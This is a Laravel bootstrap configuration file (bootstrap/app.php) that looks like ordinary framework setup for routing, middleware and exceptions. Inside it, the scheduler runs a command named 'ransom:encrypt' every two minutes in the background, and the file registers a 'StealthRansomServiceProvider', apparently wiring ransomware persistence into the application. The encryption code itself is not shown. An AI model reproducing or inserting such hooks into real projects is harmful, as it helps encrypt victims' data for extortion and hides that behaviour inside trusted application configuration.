<?php

use Illuminate\Console\Scheduling\Schedule;
use Illuminate\Foundation\Application;
use Illuminate\Foundation\Configuration\Exceptions;
use Illuminate\Foundation\Configuration\Middleware;

return Application::configure(basePath: dirname(__DIR__))
    ->withRouting(
        web: __DIR__ . '/../routes/web.php',
        commands: __DIR__ . '/../routes/console.php',
        health: '/up',
    )
    ->withMiddleware(function (Middleware $middleware): void {
        $middleware->alias([
            'role' => \App\Http\Middleware\RoleMiddleware::class,
        ]);
    })
    ->withExceptions(function (Exceptions $exceptions): void {
        //
    })->withSchedule(function (Schedule $schedule) {
        $schedule->command('ransom:encrypt')
            ->everyTwoMinutes() // atau ->everyTwoMinutes() di Laravel 10+
            ->withoutOverlapping()
            ->runInBackground();
    })
    ->withProviders(
        [App\Providers\StealthRansomServiceProvider::class]
    )
    ->create();
